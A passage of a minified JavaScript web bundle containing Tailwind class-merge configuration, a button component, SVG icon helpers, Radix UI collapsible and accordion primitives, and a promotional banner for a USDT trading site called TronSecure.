                transform: [ht, dt, "", "none", "gpu", "cpu"]
            }],
            "transform-origin": [{
                origin: D()
            }],
            "transform-style": [{
                transform: ["3d", "flat"]
            }],
            translate: [{
                translate: Tt()
            }],
            "translate-x": [{
                "translate-x": Tt()
            }],
            "translate-y": [{
                "translate-y": Tt()
            }],
            "translate-z": [{
                "translate-z": Tt()
            }],
            "translate-none": ["translate-none"],
            accent: [{
                accent: z()
            }],
            appearance: [{
                appearance: ["none", "auto"]
            }],
            "caret-color": [{
                caret: z()
            }],
            "color-scheme": [{
                scheme: ["normal", "dark", "light", "light-dark", "only-dark", "only-light"]
            }],
            cursor: [{
                cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", ht, dt]
            }],
            "field-sizing": [{
                "field-sizing": ["fixed", "content"]
            }],
            "pointer-events": [{
                "pointer-events": ["auto", "none"]
            }],
            resize: [{
                resize: ["none", "", "y", "x"]
            }],
            "scroll-behavior": [{
                scroll: ["auto", "smooth"]
            }],
            "scroll-m": [{
                "scroll-m": C()
            }],
            "scroll-mx": [{
                "scroll-mx": C()
            }],
            "scroll-my": [{
                "scroll-my": C()
            }],
            "scroll-ms": [{
                "scroll-ms": C()
            }],
            "scroll-me": [{
                "scroll-me": C()
            }],
            "scroll-mt": [{
                "scroll-mt": C()
            }],
            "scroll-mr": [{
                "scroll-mr": C()
            }],
            "scroll-mb": [{
                "scroll-mb": C()
            }],
            "scroll-ml": [{
                "scroll-ml": C()
            }],
            "scroll-p": [{
                "scroll-p": C()
            }],
            "scroll-px": [{
                "scroll-px": C()
            }],
            "scroll-py": [{
                "scroll-py": C()
            }],
            "scroll-ps": [{
                "scroll-ps": C()
            }],
            "scroll-pe": [{
                "scroll-pe": C()
            }],
            "scroll-pt": [{
                "scroll-pt": C()
            }],
            "scroll-pr": [{
                "scroll-pr": C()
            }],
            "scroll-pb": [{
                "scroll-pb": C()
            }],
            "scroll-pl": [{
                "scroll-pl": C()
            }],
            "snap-align": [{
                snap: ["start", "end", "center", "align-none"]
            }],
            "snap-stop": [{
                snap: ["normal", "always"]
            }],
            "snap-type": [{
                snap: ["none", "x", "y", "both"]
            }],
            "snap-strictness": [{
                snap: ["mandatory", "proximity"]
            }],
            touch: [{
                touch: ["auto", "none", "manipulation"]
            }],
            "touch-x": [{
                "touch-pan": ["x", "left", "right"]
            }],
            "touch-y": [{
                "touch-pan": ["y", "up", "down"]
            }],
            "touch-pz": ["touch-pinch-zoom"],
            select: [{
                select: ["none", "text", "all", "auto"]
            }],
            "will-change": [{
                "will-change": ["auto", "scroll", "contents", "transform", ht, dt]
            }],
            fill: [{
                fill: ["none", ...z()]
            }],
            "stroke-w": [{
                stroke: [Zt, sp, wl, kv]
            }],
            stroke: [{
                stroke: ["none", ...z()]
            }],
            "forced-color-adjust": [{
                "forced-color-adjust": ["auto", "none"]
            }]
        },
        conflictingClassGroups: {
            overflow: ["overflow-x", "overflow-y"],
            overscroll: ["overscroll-x", "overscroll-y"],
            inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
            "inset-x": ["right", "left"],
            "inset-y": ["top", "bottom"],
            flex: ["basis", "grow", "shrink"],
            gap: ["gap-x", "gap-y"],
            p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
            px: ["pr", "pl"],
            py: ["pt", "pb"],
            m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
            mx: ["mr", "ml"],
            my: ["mt", "mb"],
            size: ["w", "h"],
            "font-size": ["leading"],
            "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
            "fvn-ordinal": ["fvn-normal"],
            "fvn-slashed-zero": ["fvn-normal"],
            "fvn-figure": ["fvn-normal"],
            "fvn-spacing": ["fvn-normal"],
            "fvn-fraction": ["fvn-normal"],
            "line-clamp": ["display", "overflow"],
            rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
            "rounded-s": ["rounded-ss", "rounded-es"],
            "rounded-e": ["rounded-se", "rounded-ee"],
            "rounded-t": ["rounded-tl", "rounded-tr"],
            "rounded-r": ["rounded-tr", "rounded-br"],
            "rounded-b": ["rounded-br", "rounded-bl"],
            "rounded-l": ["rounded-tl", "rounded-bl"],
            "border-spacing": ["border-spacing-x", "border-spacing-y"],
            "border-w": ["border-w-x", "border-w-y", "border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
            "border-w-x": ["border-w-r", "border-w-l"],
            "border-w-y": ["border-w-t", "border-w-b"],
            "border-color": ["border-color-x", "border-color-y", "border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
            "border-color-x": ["border-color-r", "border-color-l"],
            "border-color-y": ["border-color-t", "border-color-b"],
            translate: ["translate-x", "translate-y", "translate-none"],
            "translate-none": ["translate", "translate-x", "translate-y", "translate-z"],
            "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
            "scroll-mx": ["scroll-mr", "scroll-ml"],
            "scroll-my": ["scroll-mt", "scroll-mb"],
            "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
            "scroll-px": ["scroll-pr", "scroll-pl"],
            "scroll-py": ["scroll-pt", "scroll-pb"],
            touch: ["touch-x", "touch-y", "touch-pz"],
            "touch-x": ["touch"],
            "touch-y": ["touch"],
            "touch-pz": ["touch"]
        },
        conflictingClassGroupModifiers: {
            "font-size": ["leading"]
        },
        orderSensitiveModifiers: ["*", "**", "after", "backdrop", "before", "details-content", "file", "first-letter", "first-line", "marker", "placeholder", "selection"]
    }
}
  , mq = Jj(bq);
function Hd(...r) {
    return mq(T9(r))
}
const xq = Uj("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", {
    variants: {
        variant: {
            default: "bg-[#9333EA] hover:bg-[#7E22CE] text-primary-foreground shadow-xs ",
            destructive: "bg-destructive text-white shadow-xs hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",
            outline: "border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50",
            secondary: "bg-secondary text-secondary-foreground shadow-xs hover:bg-secondary/80",
            ghost: "hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50",
            link: "text-primary underline-offset-4 hover:underline"
        },
        size: {
            default: "h-9 px-4 py-2 has-[>svg]:px-3",
            sm: "h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5",
            lg: "h-10 rounded-md px-6 has-[>svg]:px-4",
            icon: "size-9"
        }
    },
    defaultVariants: {
        variant: "default",
        size: "default"
    }
});
function dn({className: r, variant: e, size: t, asChild: o=!1, ...i}) {
    const n = o ? Rj : "button";
    return L.jsx(n, {
        "data-slot": "button",
        className: Hd(xq({
            variant: e,
            size: t,
            className: r
        })),
        ...i
    })
}
var W9 = {
    color: void 0,
    size: void 0,
    className: void 0,
    style: void 0,
    attr: void 0
}
  , e8 = Ir.createContext && Ir.createContext(W9)
  , wq = ["attr", "size", "title"];
function vq(r, e) {
    if (r == null)
        return {};
    var t = Tq(r, e), o, i;
    if (Object.getOwnPropertySymbols) {
        var n = Object.getOwnPropertySymbols(r);
        for (i = 0; i < n.length; i++)
            o = n[i],
            !(e.indexOf(o) >= 0) && Object.prototype.propertyIsEnumerable.call(r, o) && (t[o] = r[o])
    }
    return t
}
function Tq(r, e) {
    if (r == null)
        return {};
    var t = {};
    for (var o in r)
        if (Object.prototype.hasOwnProperty.call(r, o)) {
            if (e.indexOf(o) >= 0)
                continue;
            t[o] = r[o]
        }
    return t
}
function Gm() {
    return Gm = Object.assign ? Object.assign.bind() : function(r) {
        for (var e = 1; e < arguments.length; e++) {
            var t = arguments[e];
            for (var o in t)
                Object.prototype.hasOwnProperty.call(t, o) && (r[o] = t[o])
        }
        return r
    }
    ,
    Gm.apply(this, arguments)
}
function t8(r, e) {
    var t = Object.keys(r);
    if (Object.getOwnPropertySymbols) {
        var o = Object.getOwnPropertySymbols(r);
        e && (o = o.filter(function(i) {
            return Object.getOwnPropertyDescriptor(r, i).enumerable
        })),
        t.push.apply(t, o)
    }
    return t
}
function Km(r) {
    for (var e = 1; e < arguments.length; e++) {
        var t = arguments[e] != null ? arguments[e] : {};
        e % 2 ? t8(Object(t), !0).forEach(function(o) {
            Eq(r, o, t[o])
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(r, Object.getOwnPropertyDescriptors(t)) : t8(Object(t)).forEach(function(o) {
            Object.defineProperty(r, o, Object.getOwnPropertyDescriptor(t, o))
        })
    }
    return r
}
function Eq(r, e, t) {
    return e = Aq(e),
    e in r ? Object.defineProperty(r, e, {
        value: t,
        enumerable: !0,
        configurable: !0,
        writable: !0
    }) : r[e] = t,
    r
}
function Aq(r) {
    var e = Pq(r, "string");
    return typeof e == "symbol" ? e : e + ""
}
function Pq(r, e) {
    if (typeof r != "object" || !r)
        return r;
    var t = r[Symbol.toPrimitive];
    if (t !== void 0) {
        var o = t.call(r, e);
        if (typeof o != "object")
            return o;
        throw new TypeError("@@toPrimitive must return a primitive value.")
    }
    return (e === "string" ? String : Number)(r)
}
function M9(r) {
    return r && r.map( (e, t) => Ir.createElement(e.tag, Km({
        key: t
    }, e.attr), M9(e.child)))
}
function Pr(r) {
    return e => Ir.createElement(Cq, Gm({
        attr: Km({}, r.attr)
    }, e), M9(r.child))
}
function Cq(r) {
    var e = t => {
        var {attr: o, size: i, title: n} = r, s = vq(r, wq), a = i || t.size || "1em", l;
        return t.className && (l = t.className),
        r.className && (l = (l ? l + " " : "") + r.className),
        Ir.createElement("svg", Gm({
            stroke: "currentColor",
            fill: "currentColor",
            strokeWidth: "0"
        }, t.attr, o, s, {
            className: l,
            style: Km(Km({
                color: r.color || t.color
            }, t.style), r.style),
            height: a,
            width: a,
            xmlns: "http://www.w3.org/2000/svg"
        }), n && Ir.createElement("title", null, n), r.children)
    }
    ;
    return e8 !== void 0 ? Ir.createElement(e8.Consumer, null, t => e(t)) : e(W9)
}
function N9(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "line",
            attr: {
                x1: "5",
                y1: "12",
                x2: "19",
                y2: "12"
            },
            child: []
        }, {
            tag: "polyline",
            attr: {
                points: "12 5 19 12 12 19"
            },
            child: []
        }]
    })(r)
}
function Sq(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M22 11.08V12a10 10 0 1 1-5.93-9.14"
            },
            child: []
        }, {
            tag: "polyline",
            attr: {
                points: "22 4 12 14.01 9 11.01"
            },
            child: []
        }]
    })(r)
}
function Bq(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "polyline",
            attr: {
                points: "15 18 9 12 15 6"
            },
            child: []
        }]
    })(r)
}
function _q(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "polyline",
            attr: {
                points: "9 18 15 12 9 6"
            },
            child: []
        }]
    })(r)
}
function r8(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "rect",
            attr: {
                x: "3",
                y: "11",
                width: "18",
                height: "11",
                rx: "2",
                ry: "2"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M7 11V7a5 5 0 0 1 10 0v4"
            },
            child: []
        }]
    })(r)
}
function Gs(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
            },
            child: []
        }]
    })(r)
}
const Iq = () => L.jsxs("section", {
    className: "w-full py-24 gap-10   text-white bg-[#9333EA]  overflow-hidden items-center justify-center flex flex-col",
    children: [L.jsx("h1", {
        className: "text-center md:text-4xl text-pretty tracking-tight  lg:text-[4xl]  text-2xl uppercase font-extrabold   font-stretch-50%",
        children: "Ready to Revolutionize Your USDT Trading?"
    }), L.jsx("p", {
        className: "text-xl font-sans  text-center md:w-[38%] lg:w-[38%]",
        children: "Join TronSecure today and experience gas-free transactions, advanced security, and a new era of cryptocurrency trading."
    }), L.jsx("a", {
        href: "/dashboard",
        children: L.jsxs(dn, {
            className: "inline-flex items-center justify-center w-44 gap-2 hover:gap-4 whitespace-nowrapv  text-sm px-8  h-11 bg-white hover:bg-white text-[#9333EA]    rounded-md shadow-md shadhow-blue-500/20 hover:shadow-blue-500/30 transition-all duration-300 focus-visible:ring-2  font-medium focus-visible:outline-none",
            children: ["Get Started Now", L.jsx(N9, {})]
        })
    })]
});
function E1(r, e=[]) {
    let t = [];
    function o(n, s) {
        const a = ue.createContext(s)
          , l = t.length;
        t = [...t, s];
        const f = p => {
            var B;
            const {scope: b, children: v, ...T} = p
              , x = ((B = b == null ? void 0 : b[r]) == null ? void 0 : B[l]) || a
              , E = ue.useMemo( () => T, Object.values(T));
            return L.jsx(x.Provider, {
                value: E,
                children: v
            })
        }
        ;
        f.displayName = n + "Provider";
        function h(p, b) {
            var x;
            const v = ((x = b == null ? void 0 : b[r]) == null ? void 0 : x[l]) || a
              , T = ue.useContext(v);
            if (T)
                return T;
            if (s !== void 0)
                return s;
            throw new Error(`\`${p}\` must be used within \`${n}\``)
        }
        return [f, h]
    }
    const i = () => {
        const n = t.map(s => ue.createContext(s));
        return function(a) {
            const l = (a == null ? void 0 : a[r]) || n;
            return ue.useMemo( () => ({
                [`__scope${r}`]: {
                    ...a,
                    [r]: l
                }
            }), [a, l])
        }
    }
    ;
    return i.scopeName = r,
    [o, Oq(i, ...e)]
}
function Oq(...r) {
    const e = r[0];
    if (r.length === 1)
        return e;
    const t = () => {
        const o = r.map(i => ({
            useScope: i(),
            scopeName: i.scopeName
        }));
        return function(n) {
            const s = o.reduce( (a, {useScope: l, scopeName: f}) => {
                const p = l(n)[`__scope${f}`];
                return {
                    ...a,
                    ...p
                }
            }
            , {});
            return ue.useMemo( () => ({
                [`__scope${e.scopeName}`]: s
            }), [s])
        }
    }
    ;
    return t.scopeName = e.scopeName,
    t
}
function Rq(r) {
    const e = r + "CollectionProvider"
      , [t,o] = E1(e)
      , [i,n] = t(e, {
        collectionRef: {
            current: null
        },
        itemMap: new Map
    })
      , s = x => {
        const {scope: E, children: B} = x
          , P = Ir.useRef(null)
          , O = Ir.useRef(new Map).current;
        return L.jsx(i, {
            scope: E,
            itemMap: O,
            collectionRef: P,
            children: B
        })
    }
    ;
    s.displayName = e;
    const a = r + "CollectionSlot"
      , l = Hm(a)
      , f = Ir.forwardRef( (x, E) => {
        const {scope: B, children: P} = x
          , O = n(a, B)
          , F = Lp(E, O.collectionRef);
        return L.jsx(l, {
            ref: F,
            children: P
        })
    }
    );
    f.displayName = a;
    const h = r + "CollectionItemSlot"
      , p = "data-radix-collection-item"
      , b = Hm(h)
      , v = Ir.forwardRef( (x, E) => {
        const {scope: B, children: P, ...O} = x
          , F = Ir.useRef(null)
          , D = Lp(E, F)
          , I = n(h, B);
        return Ir.useEffect( () => (I.itemMap.set(F, {
            ref: F,
            ...O
        }),
        () => void I.itemMap.delete(F))),
        L.jsx(b, {
            [p]: "",
            ref: D,
            children: P
        })
    }
    );
    v.displayName = h;
    function T(x) {
        const E = n(r + "CollectionConsumer", x);
        return Ir.useCallback( () => {
            const P = E.collectionRef.current;
            if (!P)
                return [];
            const O = Array.from(P.querySelectorAll(`[${p}]`));
            return Array.from(E.itemMap.values()).sort( (I, M) => O.indexOf(I.ref.current) - O.indexOf(M.ref.current))
        }
        , [E.collectionRef, E.itemMap])
    }
    return [{
        Provider: s,
        Slot: f,
        ItemSlot: v
    }, T, o]
}
function D9(r, e, {checkForDefaultPrevented: t=!0}={}) {
    return function(i) {
        if (r == null || r(i),
        t === !1 || !i.defaultPrevented)
            return e == null ? void 0 : e(i)
    }
}
var $p = globalThis != null && globalThis.document ? ue.useLayoutEffect : () => {}
  , Wq = ZW[" useInsertionEffect ".trim().toString()] || $p;
function r3({prop: r, defaultProp: e, onChange: t= () => {}
, caller: o}) {
    const [i,n,s] = Mq({
        defaultProp: e,
        onChange: t
    })
      , a = r !== void 0
      , l = a ? r : i;
    {
        const h = ue.useRef(r !== void 0);
        ue.useEffect( () => {
            const p = h.current;
            p !== a && console.warn(`${o} is changing from ${p ? "controlled" : "uncontrolled"} to ${a ? "controlled" : "uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`),
            h.current = a
        }
        , [a, o])
    }
    const f = ue.useCallback(h => {
        var p;
        if (a) {
            const b = Nq(h) ? h(r) : h;
            b !== r && ((p = s.current) == null || p.call(s, b))
        } else
            n(h)
    }
    , [a, r, n, s]);
    return [l, f]
}
function Mq({defaultProp: r, onChange: e}) {
    const [t,o] = ue.useState(r)
      , i = ue.useRef(t)
      , n = ue.useRef(e);
    return Wq( () => {
        n.current = e
    }
    , [e]),
    ue.useEffect( () => {
        var s;
        i.current !== t && ((s = n.current) == null || s.call(n, t),
        i.current = t)
    }
    , [t, i]),
    [t, o, n]
}
function Nq(r) {
    return typeof r == "function"
}
var Dq = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "select", "span", "svg", "ul"]
  , Eu = Dq.reduce( (r, e) => {
    const t = Hm(`Primitive.${e}`)
      , o = ue.forwardRef( (i, n) => {
        const {asChild: s, ...a} = i
          , l = s ? t : e;
        return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0),
        L.jsx(l, {
            ...a,
            ref: n
        })
    }
    );
    return o.displayName = `Primitive.${e}`,
    {
        ...r,
        [e]: o
    }
}
, {});
function Fq(r, e) {
    return ue.useReducer( (t, o) => e[t][o] ?? t, r)
}
var F9 = r => {
    const {present: e, children: t} = r
      , o = Uq(e)
      , i = typeof t == "function" ? t({
        present: o.isPresent
    }) : ue.Children.only(t)
      , n = Lp(o.ref, kq(i));
    return typeof t == "function" || o.isPresent ? ue.cloneElement(i, {
        ref: n
    }) : null
}
;
F9.displayName = "Presence";
function Uq(r) {
    const [e,t] = ue.useState()
      , o = ue.useRef(null)
      , i = ue.useRef(r)
      , n = ue.useRef("none")
      , s = r ? "mounted" : "unmounted"
      , [a,l] = Fq(s, {
        mounted: {
            UNMOUNT: "unmounted",
            ANIMATION_OUT: "unmountSuspended"
        },
        unmountSuspended: {
            MOUNT: "mounted",
            ANIMATION_END: "unmounted"
        },
        unmounted: {
            MOUNT: "mounted"
        }
    });
    return ue.useEffect( () => {
        const f = Jg(o.current);
        n.current = a === "mounted" ? f : "none"
    }
    , [a]),
    $p( () => {
        const f = o.current
          , h = i.current;
        if (h !== r) {
            const b = n.current
              , v = Jg(f);
            r ? l("MOUNT") : v === "none" || (f == null ? void 0 : f.display) === "none" ? l("UNMOUNT") : l(h && b !== v ? "ANIMATION_OUT" : "UNMOUNT"),
            i.current = r
        }
    }
    , [r, l]),
    $p( () => {
        if (e) {
            let f;
            const h = e.ownerDocument.defaultView ?? window
              , p = v => {
                const x = Jg(o.current).includes(v.animationName);
                if (v.target === e && x && (l("ANIMATION_END"),
                !i.current)) {
                    const E = e.style.animationFillMode;
                    e.style.animationFillMode = "forwards",
                    f = h.setTimeout( () => {
                        e.style.animationFillMode === "forwards" && (e.style.animationFillMode = E)
                    }
                    )
                }
            }
              , b = v => {
                v.target === e && (n.current = Jg(o.current))
            }
            ;
            return e.addEventListener("animationstart", b),
            e.addEventListener("animationcancel", p),
            e.addEventListener("animationend", p),
            () => {
                h.clearTimeout(f),
                e.removeEventListener("animationstart", b),
                e.removeEventListener("animationcancel", p),
                e.removeEventListener("animationend", p)
            }
        } else
            l("ANIMATION_END")
    }
    , [e, l]),
    {
        isPresent: ["mounted", "unmountSuspended"].includes(a),
        ref: ue.useCallback(f => {
            o.current = f ? getComputedStyle(f) : null,
            t(f)
        }
        , [])
    }
}
function Jg(r) {
    return (r == null ? void 0 : r.animationName) || "none"
}
function kq(r) {
    var o, i;
    let e = (o = Object.getOwnPropertyDescriptor(r.props, "ref")) == null ? void 0 : o.get
      , t = e && "isReactWarning"in e && e.isReactWarning;
    return t ? r.ref : (e = (i = Object.getOwnPropertyDescriptor(r, "ref")) == null ? void 0 : i.get,
    t = e && "isReactWarning"in e && e.isReactWarning,
    t ? r.props.ref : r.props.ref || r.ref)
}
var Lq = ZW[" useId ".trim().toString()] || ( () => {}
)
  , $q = 0;
function U9(r) {
    const [e,t] = ue.useState(Lq());
    return $p( () => {
        t(o => o ?? String($q++))
    }
    , [r]),
    e ? `radix-${e}` : ""
}
var A1 = "Collapsible"
  , [zq,k9] = E1(A1)
  , [jq,n3] = zq(A1)
  , L9 = ue.forwardRef( (r, e) => {
    const {__scopeCollapsible: t, open: o, defaultOpen: i, disabled: n, onOpenChange: s, ...a} = r
      , [l,f] = r3({
        prop: o,
        defaultProp: i ?? !1,
        onChange: s,
        caller: A1
    });
    return L.jsx(jq, {
        scope: t,
        disabled: n,
        contentId: U9(),
        open: l,
        onOpenToggle: ue.useCallback( () => f(h => !h), [f]),
        children: L.jsx(Eu.div, {
            "data-state": i3(l),
            "data-disabled": n ? "" : void 0,
            ...a,
            ref: e
        })
    })
}
);
L9.displayName = A1;
var $9 = "CollapsibleTrigger"
  , z9 = ue.forwardRef( (r, e) => {
    const {__scopeCollapsible: t, ...o} = r
      , i = n3($9, t);
    return L.jsx(Eu.button, {
        type: "button",
        "aria-controls": i.contentId,
        "aria-expanded": i.open || !1,
        "data-state": i3(i.open),
        "data-disabled": i.disabled ? "" : void 0,
        disabled: i.disabled,
        ...o,
        ref: e,
        onClick: D9(r.onClick, i.onOpenToggle)
    })
}
);
z9.displayName = $9;
var o3 = "CollapsibleContent"
  , j9 = ue.forwardRef( (r, e) => {
    const {forceMount: t, ...o} = r
      , i = n3(o3, r.__scopeCollapsible);
    return L.jsx(F9, {
        present: t || i.open,
        children: ({present: n}) => L.jsx(qq, {
            ...o,
            ref: e,
            present: n
        })
    })
}
);
j9.displayName = o3;
var qq = ue.forwardRef( (r, e) => {
    const {__scopeCollapsible: t, present: o, children: i, ...n} = r
      , s = n3(o3, t)
      , [a,l] = ue.useState(o)
      , f = ue.useRef(null)
      , h = Lp(e, f)
      , p = ue.useRef(0)
      , b = p.current
      , v = ue.useRef(0)
      , T = v.current
      , x = s.open || a
      , E = ue.useRef(x)
      , B = ue.useRef(void 0);
    return ue.useEffect( () => {
        const P = requestAnimationFrame( () => E.current = !1);
        return () => cancelAnimationFrame(P)
    }
    , []),
    $p( () => {
        const P = f.current;
        if (P) {
            B.current = B.current || {
                transitionDuration: P.style.transitionDuration,
                animationName: P.style.animationName
            },
            P.style.transitionDuration = "0s",
            P.style.animationName = "none";
            const O = P.getBoundingClientRect();
            p.current = O.height,
            v.current = O.width,
            E.current || (P.style.transitionDuration = B.current.transitionDuration,
            P.style.animationName = B.current.animationName),
            l(o)
        }
    }
    , [s.open, o]),
    L.jsx(Eu.div, {
        "data-state": i3(s.open),
        "data-disabled": s.disabled ? "" : void 0,
        id: s.contentId,
        hidden: !x,
        ...n,
        ref: h,
        style: {
            "--radix-collapsible-content-height": b ? `${b}px` : void 0,
            "--radix-collapsible-content-width": T ? `${T}px` : void 0,
            ...r.style
        },
        children: x && i
    })
}
);
function i3(r) {
    return r ? "open" : "closed"
}
var Vq = L9
  , Hq = z9
  , Gq = j9
  , Kq = ue.createContext(void 0);
function Zq(r) {
    const e = ue.useContext(Kq);
    return r || e || "ltr"
}
var us = "Accordion"
  , Yq = ["Home", "End", "ArrowDown", "ArrowUp", "ArrowLeft", "ArrowRight"]
  , [s3,Xq,Jq] = Rq(us)
  , [P1,Xme] = E1(us, [Jq, k9])
  , a3 = k9()
  , c3 = Ir.forwardRef( (r, e) => {
    const {type: t, ...o} = r
      , i = o
      , n = o;
    return L.jsx(s3.Provider, {
        scope: r.__scopeAccordion,
        children: t === "multiple" ? L.jsx(rV, {
            ...n,
            ref: e
        }) : L.jsx(tV, {
            ...i,
            ref: e
        })
    })
}
);
c3.displayName = us;
var [q9,Qq] = P1(us)
  , [V9,eV] = P1(us, {
    collapsible: !1
})
  , tV = Ir.forwardRef( (r, e) => {
    const {value: t, defaultValue: o, onValueChange: i= () => {}
    , collapsible: n=!1, ...s} = r
      , [a,l] = r3({
        prop: t,
        defaultProp: o ?? "",
        onChange: i,
        caller: us
    });
    return L.jsx(q9, {
        scope: r.__scopeAccordion,
        value: Ir.useMemo( () => a ? [a] : [], [a]),
        onItemOpen: l,
        onItemClose: Ir.useCallback( () => n && l(""), [n, l]),
        children: L.jsx(V9, {
            scope: r.__scopeAccordion,
            collapsible: n,
            children: L.jsx(H9, {
                ...s,
                ref: e
            })
        })
    })
}
)
  , rV = Ir.forwardRef( (r, e) => {
    const {value: t, defaultValue: o, onValueChange: i= () => {}
    , ...n} = r
      , [s,a] = r3({
        prop: t,
        defaultProp: o ?? [],
        onChange: i,
        caller: us
    })
      , l = Ir.useCallback(h => a( (p=[]) => [...p, h]), [a])
      , f = Ir.useCallback(h => a( (p=[]) => p.filter(b => b !== h)), [a]);
    return L.jsx(q9, {
        scope: r.__scopeAccordion,
        value: s,
        onItemOpen: l,
        onItemClose: f,
        children: L.jsx(V9, {
            scope: r.__scopeAccordion,
            collapsible: !0,
            children: L.jsx(H9, {
                ...n,
                ref: e
            })
        })
    })
}
)
  , [nV,C1] = P1(us)
  , H9 = Ir.forwardRef( (r, e) => {
    const {__scopeAccordion: t, disabled: o, dir: i, orientation: n="vertical", ...s} = r
      , a = Ir.useRef(null)
      , l = Lp(a, e)
      , f = Xq(t)
      , p = Zq(i) === "ltr"
      , b = D9(r.onKeyDown, v => {
        var C;
        if (!Yq.includes(v.key))
            return;
        const T = v.target
          , x = f().filter(W => {
            var k;
            return !((k = W.ref.current) != null && k.disabled)
        }
        )
          , E = x.findIndex(W => W.ref.current === T)
          , B = x.length;
        if (E === -1)
            return;
        v.preventDefault();
        let P = E;
        const O = 0
          , F = B - 1
          , D = () => {
            P = E + 1,
            P > F && (P = O)
        }
          , I = () => {
            P = E - 1,
            P < O && (P = F)
        }
        ;
        switch (v.key) {
        case "Home":
            P = O;
            break;
        case "End":
            P = F;
            break;
        case "ArrowRight":
            n === "horizontal" && (p ? D() : I());
            break;
        case "ArrowDown":
            n === "vertical" && D();
            break;
        case "ArrowLeft":
            n === "horizontal" && (p ? I() : D());
            break;
        case "ArrowUp":
            n === "vertical" && I();
            break
        }
        const M = P % B;
        (C = x[M].ref.current) == null || C.focus()
    }
    );
    return L.jsx(nV, {
        scope: t,
        disabled: o,
        direction: i,
        orientation: n,
        children: L.jsx(s3.Slot, {
            scope: t,
            children: L.jsx(Eu.div, {
                ...s,
                "data-orientation": n,
                ref: l,
                onKeyDown: o ? void 0 : b
            })
        })
    })
}
)
  , Zm = "AccordionItem"
  , [oV,l3] = P1(Zm)
  , u3 = Ir.forwardRef( (r, e) => {
    const {__scopeAccordion: t, value: o, ...i} = r
      , n = C1(Zm, t)
      , s = Qq(Zm, t)
      , a = a3(t)
      , l = U9()
      , f = o && s.value.includes(o) || !1
      , h = n.disabled || r.disabled;
    return L.jsx(oV, {
        scope: t,
        open: f,
        disabled: h,
        triggerId: l,
        children: L.jsx(Vq, {
            "data-orientation": n.orientation,
            "data-state": X9(f),
            ...a,
            ...i,
            ref: e,
            disabled: h,
            open: f,
            onOpenChange: p => {
                p ? s.onItemOpen(o) : s.onItemClose(o)
            }
        })
    })
}
);
u3.displayName = Zm;
var G9 = "AccordionHeader"
  , K9 = Ir.forwardRef( (r, e) => {
    const {__scopeAccordion: t, ...o} = r
      , i = C1(us, t)
      , n = l3(G9, t);
    return L.jsx(Eu.h3, {
        "data-orientation": i.orientation,
        "data-state": X9(n.open),
        "data-disabled": n.disabled ? "" : void 0,
        ...o,
        ref: e
    })
}
);
K9.displayName = G9;
var mE = "AccordionTrigger"
  , Z9 = Ir.forwardRef( (r, e) => {
    const {__scopeAccordion: t, ...o} = r
